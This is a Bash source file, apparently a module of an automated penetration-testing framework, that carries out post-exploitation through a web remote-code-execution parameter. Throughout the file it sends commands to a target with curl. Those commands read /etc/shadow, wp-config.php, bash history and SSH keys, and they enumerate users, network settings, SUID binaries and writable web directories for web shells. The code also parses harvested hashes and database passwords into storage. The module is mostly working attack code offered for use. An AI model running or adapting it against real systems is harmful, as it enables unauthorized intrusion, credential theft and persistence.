#!/bin/bash

# Post-Exploitation Module
# Automated reconnaissance and privilege escalation after initial access

source "$(dirname "${BASH_SOURCE[0]}")/../../core/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/database.sh"

# Main post-exploitation function
post_exploit() {
    local target_url=$1
    local parameter=$2
    local project_id=$3

    log_warning "[Post-Exploit] Starting post-exploitation phase"
    log_warning "[Post-Exploit] Target: $target_url"

    local exploit_dir="data/projects/${project_id}/exploitation/post_exploit"
    mkdir -p "$exploit_dir"

    # Phase 1: System Enumeration
    log_info "[Post-Exploit] Phase 1: System Enumeration"
    enumerate_system "$target_url" "$parameter" "$exploit_dir"

    # Phase 2: User Enumeration
    log_info "[Post-Exploit] Phase 2: User Enumeration"
    enumerate_users "$target_url" "$parameter" "$exploit_dir"

    # Phase 3: Network Enumeration
    log_info "[Post-Exploit] Phase 3: Network Enumeration"
    enumerate_network "$target_url" "$parameter" "$exploit_dir"

    # Phase 4: Credential Harvesting
    log_info "[Post-Exploit] Phase 4: Credential Harvesting"
    harvest_credentials "$target_url" "$parameter" "$exploit_dir" "$project_id"

    # Phase 5: Privilege Escalation Checks
    log_info "[Post-Exploit] Phase 5: Privilege Escalation Enumeration"
    enumerate_privesc "$target_url" "$parameter" "$exploit_dir"

    # Phase 6: Persistence Opportunities
    log_info "[Post-Exploit] Phase 6: Persistence Enumeration"
    enumerate_persistence "$target_url" "$parameter" "$exploit_dir"

    # Generate comprehensive report
    generate_post_exploit_report "$exploit_dir"

    log_success "[Post-Exploit] Post-exploitation completed. Report: ${exploit_dir}/report.txt"
}

# Enumerate system information
enumerate_system() {
    local url=$1
    local param=$2
    local exploit_dir=$3

    log_debug "[Post-Exploit] Enumerating system information"

    local system_info="${exploit_dir}/system_info.txt"

    cat > "$system_info" <<EOF
=== SYSTEM ENUMERATION ===
Timestamp: $(date)

EOF

    # OS Information
    local os_info=$(execute_rce_command "$url" "$param" "uname -a")
    echo -e "OS Information:\n$os_info\n" >> "$system_info"

    # Kernel version
    local kernel=$(execute_rce_command "$url" "$param" "uname -r")
    echo -e "Kernel Version:\n$kernel\n" >> "$system_info"

    # Distribution info
    local distro=$(execute_rce_command "$url" "$param" "cat /etc/*-release 2>/dev/null || cat /etc/issue")
    echo -e "Distribution:\n$distro\n" >> "$system_info"

    # Hostname
    local hostname=$(execute_rce_command "$url" "$param" "hostname")
    echo -e "Hostname:\n$hostname\n" >> "$system_info"

    # Architecture
    local arch=$(execute_rce_command "$url" "$param" "arch")
    echo -e "Architecture:\n$arch\n" >> "$system_info"

    # Uptime
    local uptime=$(execute_rce_command "$url" "$param" "uptime")
    echo -e "Uptime:\n$uptime\n" >> "$system_info"

    # Running processes
    local processes=$(execute_rce_command "$url" "$param" "ps aux")
    echo -e "Running Processes:\n$processes\n" >> "$system_info"

    # Environment variables
    local env=$(execute_rce_command "$url" "$param" "env")
    echo -e "Environment Variables:\n$env\n" >> "$system_info"

    log_success "[Post-Exploit] System enumeration saved to: $system_info"
}

# Enumerate users
enumerate_users() {
    local url=$1
    local param=$2
    local exploit_dir=$3

    log_debug "[Post-Exploit] Enumerating users"

    local users_info="${exploit_dir}/users_info.txt"

    cat > "$users_info" <<EOF
=== USER ENUMERATION ===
Timestamp: $(date)

EOF

    # Current user
    local current_user=$(execute_rce_command "$url" "$param" "whoami")
    echo -e "Current User:\n$current_user\n" >> "$users_info"

    # User ID
    local user_id=$(execute_rce_command "$url" "$param" "id")
    echo -e "User ID:\n$user_id\n" >> "$users_info"

    # All users
    local all_users=$(execute_rce_command "$url" "$param" "cat /etc/passwd")
    echo -e "All Users (/etc/passwd):\n$all_users\n" >> "$users_info"

    # Users with bash shell
    local bash_users=$(execute_rce_command "$url" "$param" "grep -E '/bin/(ba)?sh' /etc/passwd")
    echo -e "Users with Bash shell:\n$bash_users\n" >> "$users_info"

    # Sudo privileges
    local sudo_check=$(execute_rce_command "$url" "$param" "sudo -l 2>&1")
    echo -e "Sudo Privileges:\n$sudo_check\n" >> "$users_info"

    # Groups
    local groups=$(execute_rce_command "$url" "$param" "groups")
    echo -e "User Groups:\n$groups\n" >> "$users_info"

    # Logged in users
    local logged_in=$(execute_rce_command "$url" "$param" "w")
    echo -e "Currently Logged In:\n$logged_in\n" >> "$users_info"

    # Last logins
    local last_logins=$(execute_rce_command "$url" "$param" "last -n 20")
    echo -e "Recent Logins:\n$last_logins\n" >> "$users_info"

    log_success "[Post-Exploit] User enumeration saved to: $users_info"
}

# Enumerate network configuration
enumerate_network() {
    local url=$1
    local param=$2
    local exploit_dir=$3

    log_debug "[Post-Exploit] Enumerating network configuration"

    local network_info="${exploit_dir}/network_info.txt"

    cat > "$network_info" <<EOF
=== NETWORK ENUMERATION ===
Timestamp: $(date)

EOF

    # Network interfaces
    local interfaces=$(execute_rce_command "$url" "$param" "ip addr show 2>/dev/null || ifconfig")
    echo -e "Network Interfaces:\n$interfaces\n" >> "$network_info"

    # Routing table
    local routes=$(execute_rce_command "$url" "$param" "ip route 2>/dev/null || route -n")
    echo -e "Routing Table:\n$routes\n" >> "$network_info"

    # DNS configuration
    local dns=$(execute_rce_command "$url" "$param" "cat /etc/resolv.conf")
    echo -e "DNS Configuration:\n$dns\n" >> "$network_info"

    # Active connections
    local connections=$(execute_rce_command "$url" "$param" "netstat -tulpn 2>/dev/null || ss -tulpn")
    echo -e "Active Connections:\n$connections\n" >> "$network_info"

    # Firewall rules
    local firewall=$(execute_rce_command "$url" "$param" "iptables -L 2>/dev/null || ufw status")
    echo -e "Firewall Rules:\n$firewall\n" >> "$network_info"

    # ARP cache
    local arp=$(execute_rce_command "$url" "$param" "arp -a 2>/dev/null || ip neigh")
    echo -e "ARP Cache:\n$arp\n" >> "$network_info"

    log_success "[Post-Exploit] Network enumeration saved to: $network_info"
}

# Harvest credentials
harvest_credentials() {
    local url=$1
    local param=$2
    local exploit_dir=$3
    local project_id=$4

    log_debug "[Post-Exploit] Harvesting credentials"

    local creds_info="${exploit_dir}/credentials_found.txt"

    cat > "$creds_info" <<EOF
=== CREDENTIAL HARVESTING ===
Timestamp: $(date)

EOF

    # Shadow file (if accessible)
    local shadow=$(execute_rce_command "$url" "$param" "cat /etc/shadow 2>/dev/null")
    if [ -n "$shadow" ] && [ "$shadow" != "cat: /etc/shadow: Permission denied" ]; then
        log_critical "[Post-Exploit] /etc/shadow is readable!"
        echo -e "Shadow File:\n$shadow\n" >> "$creds_info"

        # Parse and add hashes to database
        echo "$shadow" | while IFS=: read -r username hash rest; do
            if [ -n "$hash" ] && [ ${#hash} -gt 10 ]; then
                db_add_credential "$project_id" "$username" "" "$hash" "Post-exploitation: /etc/shadow"
                log_success "[Post-Exploit] Hash extracted: $username"
            fi
        done
    fi

    # SSH keys
    local ssh_keys=$(execute_rce_command "$url" "$param" "find /home -name '*.pub' -o -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null | head -20")
    echo -e "SSH Keys Found:\n$ssh_keys\n" >> "$creds_info"

    # History files (may contain credentials)
    local bash_history=$(execute_rce_command "$url" "$param" "cat ~/.bash_history /root/.bash_history 2>/dev/null | grep -E 'password|passwd|mysql|ssh|ftp' | head -50")
    echo -e "Interesting History Commands:\n$bash_history\n" >> "$creds_info"

    # Database config files
    local db_configs=$(execute_rce_command "$url" "$param" "find /var/www /home -name 'config.php' -o -name 'database.yml' -o -name '.env' 2>/dev/null | head -20")
    echo -e "Database Config Files:\n$db_configs\n" >> "$creds_info"

    # Check common config files
    local wp_config=$(execute_rce_command "$url" "$param" "cat /var/www/html/wp-config.php 2>/dev/null | grep -E 'DB_PASSWORD|DB_USER'")
    if [ -n "$wp_config" ]; then
        echo -e "WordPress Config:\n$wp_config\n" >> "$creds_info"

        # Extract and save credentials
        local db_user=$(echo "$wp_config" | grep DB_USER | cut -d"'" -f4)
        local db_pass=$(echo "$wp_config" | grep DB_PASSWORD | cut -d"'" -f4)

        if [ -n "$db_user" ] && [ -n "$db_pass" ]; then
            db_add_credential "$project_id" "$db_user" "$db_pass" "" "Post-exploitation: wp-config.php"
            log_success "[Post-Exploit] WordPress DB credentials: $db_user"
        fi
    fi

    log_success "[Post-Exploit] Credential harvesting saved to: $creds_info"
}

# Enumerate privilege escalation vectors
enumerate_privesc() {
    local url=$1
    local param=$2
    local exploit_dir=$3

    log_debug "[Post-Exploit] Enumerating privilege escalation vectors"

    local privesc_info="${exploit_dir}/privesc_vectors.txt"

    cat > "$privesc_info" <<EOF
=== PRIVILEGE ESCALATION ENUMERATION ===
Timestamp: $(date)

EOF

    # SUID binaries
    local suid_bins=$(execute_rce_command "$url" "$param" "find / -perm -4000 -type f 2>/dev/null | head -50")
    echo -e "SUID Binaries:\n$suid_bins\n" >> "$privesc_info"

    # Writable /etc/passwd
    local passwd_writable=$(execute_rce_command "$url" "$param" "ls -la /etc/passwd")
    echo -e "/etc/passwd Permissions:\n$passwd_writable\n" >> "$privesc_info"

    # Sudo version (check for CVEs)
    local sudo_version=$(execute_rce_command "$url" "$param" "sudo -V 2>&1 | head -1")
    echo -e "Sudo Version:\n$sudo_version\n" >> "$privesc_info"

    # Cron jobs
    local cron_jobs=$(execute_rce_command "$url" "$param" "cat /etc/crontab 2>/dev/null && ls -la /etc/cron.* 2>/dev/null")
    echo -e "Cron Jobs:\n$cron_jobs\n" >> "$privesc_info"

    # Capabilities
    local capabilities=$(execute_rce_command "$url" "$param" "getcap -r / 2>/dev/null | head -30")
    echo -e "File Capabilities:\n$capabilities\n" >> "$privesc_info"

    # Kernel exploits (check kernel version)
    local kernel=$(execute_rce_command "$url" "$param" "uname -r")
    echo -e "Kernel Version (check for exploits):\n$kernel\n" >> "$privesc_info"
    echo -e "Suggested checks:\n- Dirty COW (< 4.8.3)\n- Dirty Pipe (5.8-5.16)\n- PwnKit (CVE-2021-4034)\n\n" >> "$privesc_info"

    # NFS exports (if any)
    local nfs_exports=$(execute_rce_command "$url" "$param" "cat /etc/exports 2>/dev/null")
    echo -e "NFS Exports:\n$nfs_exports\n" >> "$privesc_info"

    # Docker group membership
    local docker_check=$(execute_rce_command "$url" "$param" "groups | grep docker && docker ps 2>/dev/null")
    echo -e "Docker Access:\n$docker_check\n" >> "$privesc_info"

    log_success "[Post-Exploit] Privesc enumeration saved to: $privesc_info"
}

# Enumerate persistence opportunities
enumerate_persistence() {
    local url=$1
    local param=$2
    local exploit_dir=$3

    log_debug "[Post-Exploit] Enumerating persistence opportunities"

    local persist_info="${exploit_dir}/persistence_options.txt"

    cat > "$persist_info" <<EOF
=== PERSISTENCE ENUMERATION ===
Timestamp: $(date)

EOF

    # Writable startup scripts
    local startup=$(execute_rce_command "$url" "$param" "find /etc/rc*.d/ -writable 2>/dev/null")
    echo -e "Writable Startup Scripts:\n$startup\n" >> "$persist_info"

    # Systemd services
    local systemd=$(execute_rce_command "$url" "$param" "ls -la /etc/systemd/system/ 2>/dev/null")
    echo -e "Systemd Services:\n$systemd\n" >> "$persist_info"

    # SSH authorized_keys
    local ssh_auth=$(execute_rce_command "$url" "$param" "find /home /root -name 'authorized_keys' 2>/dev/null | xargs ls -la 2>/dev/null")
    echo -e "SSH Authorized Keys:\n$ssh_auth\n" >> "$persist_info"

    # Cron persistence
    local user_cron=$(execute_rce_command "$url" "$param" "crontab -l 2>/dev/null")
    echo -e "User Crontab:\n$user_cron\n" >> "$persist_info"

    # Web shells location
    local web_dirs=$(execute_rce_command "$url" "$param" "find /var/www -type d -writable 2>/dev/null | head -10")
    echo -e "Writable Web Directories (for web shells):\n$web_dirs\n" >> "$persist_info"

    log_success "[Post-Exploit] Persistence enumeration saved to: $persist_info"
}

# Generate comprehensive post-exploitation report
generate_post_exploit_report() {
    local exploit_dir=$1

    local report="${exploit_dir}/report.txt"

    cat > "$report" <<EOF
========================================
POST-EXPLOITATION REPORT
========================================
Generated: $(date)

This report contains information gathered during post-exploitation phase.

FILES GENERATED:
- system_info.txt       : System and OS information
- users_info.txt        : User accounts and privileges
- network_info.txt      : Network configuration
- credentials_found.txt : Harvested credentials and hashes
- privesc_vectors.txt   : Privilege escalation opportunities
- persistence_options.txt : Persistence mechanisms

NEXT STEPS:
1. Review credential harvesting results
2. Attempt privilege escalation using identified vectors
3. Establish persistence if authorized
4. Perform lateral movement enumeration
5. Exfiltrate valuable data (if in scope)

WARNING: Only proceed with explicit authorization!
EOF

    log_success "[Post-Exploit] Report generated: $report"
}

# Helper: Execute RCE command and return output
execute_rce_command() {
    local url=$1
    local param=$2
    local command=$3

    # URL encode command
    local encoded_cmd=$(urlencode "$command")

    # Build URL
    local test_url
    if [[ "$url" == *"?"* ]]; then
        if [[ "$url" == *"$param="* ]]; then
            test_url=$(echo "$url" | sed "s|$param=[^&]*|$param=$encoded_cmd|")
        else
            test_url="${url}&${param}=${encoded_cmd}"
        fi
    else
        test_url="${url}?${param}=${encoded_cmd}"
    fi

    # Execute and return output
    curl -s -L --max-time 15 "$test_url"
}

# Helper: URL encode
urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done

    echo "$encoded"
}

# Export functions
export -f post_exploit
export -f enumerate_system
export -f enumerate_users
export -f enumerate_network
export -f harvest_credentials
export -f enumerate_privesc
export -f enumerate_persistence
export -f generate_post_exploit_report
export -f execute_rce_command
export -f urlencode
